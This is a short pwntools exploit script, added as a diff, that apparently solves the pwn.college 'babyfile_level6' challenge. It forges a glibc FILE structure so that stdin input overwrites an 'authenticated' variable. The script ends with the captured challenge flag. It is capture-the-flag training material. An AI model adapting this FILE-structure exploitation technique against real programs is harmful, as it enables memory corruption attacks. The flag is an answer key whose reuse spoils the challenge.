@@ -1,0 +1,25 @@
+from pwn import *
+
+# overwrite stdin
+
+context.arch = 'amd64'
+
+script = '''
+b *challenge
+'''
+
+p = process("/challenge/babyfile_level6")
+
+authenticated = 0x4041F8
+
+payload = p64(0xfbad208b) # flag
+payload += p64(0) * 6
+payload += p64(authenticated) # buf_base
+payload += p64(authenticated + 0x100) # buf_end
+
+p.sendafter(b"Now reading from stdin directly to the FILE struct.", payload)
+
+p.sendafter(b"Here is the contents of the FILE structure.", b"A" * 0x100)
+
+p.interactive()
+#pwn.college{cQG-844Pj6qG0wGDFNd0J4AWeNK.dVDN0MDL2EzNyYzW}
